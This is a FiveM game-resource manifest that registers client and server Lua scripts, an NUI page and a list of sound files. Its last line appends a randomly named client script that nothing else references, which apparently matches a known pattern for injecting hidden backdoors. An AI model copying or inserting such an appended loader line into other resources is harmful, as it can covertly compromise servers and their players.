fx_version 'bodacious'
game 'gta5'

-- Manifest Version

-- Client Scripts
client_script 'client/main.lua'

-- Server Scripts
server_script 'server/main.lua'

-- NUI Default Page
ui_page('client/html/index.html')

-- Files needed for NUI
-- DON'T FORGET TO ADD THE SOUND FILES TO THIS!
files {
    'client/html/index.html',
    -- Begin Sound Files Here...
    -- client/html/sounds/ ... .ogg
    'client/html/sounds/demo.ogg',
    'client/html/sounds/buckle.ogg',
    'client/html/sounds/seatbelt.ogg',
    'client/html/sounds/unbuckle.ogg',
    'client/html/sounds/off.ogg',
    'client/html/sounds/on.ogg',
    'client/html/sounds/cell.ogg',
    'client/html/sounds/pager.ogg',
    'client/html/sounds/panic.ogg',
    'client/html/sounds/shake.ogg',
    'client/html/sounds/drop.ogg',
    'client/html/sounds/lock.ogg',
    'client/html/sounds/unlock.ogg',
    'client/html/sounds/cuff.ogg'
}

client_script "DISqkiIEcVydGenWnD.lua"